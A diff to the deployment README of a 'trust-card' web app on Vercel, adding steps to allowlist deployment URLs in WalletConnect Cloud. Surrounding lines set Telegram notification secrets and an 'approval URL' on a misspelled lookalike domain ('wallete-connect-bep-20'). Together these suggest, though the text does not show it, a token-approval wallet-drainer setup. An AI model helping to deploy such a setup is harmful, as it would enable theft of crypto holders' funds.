@@ -9,6 +9,11 @@ Same as the BEP20 reference site. Add these in **Vercel → Project → Settings
 | `TELEGRAM_BOT_TOKEN` | (Optional) From @BotFather for notifications | |
 | `TELEGRAM_CHAT_ID` | (Optional) Chat ID for notifications | |
 
+**WalletConnect "origin not allowed" (code 3000):** Add your deployment URLs to the [WalletConnect Cloud allowlist](https://dashboard.walletconnect.com) → Project → Allowlist. Include:
+- `https://trust-card.vercel.app`
+- `https://trust-card-git-main-*.vercel.app` (or each preview URL)
+- `https://*.vercel.app` to allow all preview deployments
+
 **Note:** The `/api/config` serverless endpoint injects these at runtime. Ensure the `api/` folder is deployed. If `/api/config` is not available, add before `apply-now-flow.js`:
 ```html
 <script>window.TRUST_CARD_APPROVAL_URL='https://wallete-connect-bep-20.vercel.app';</script>
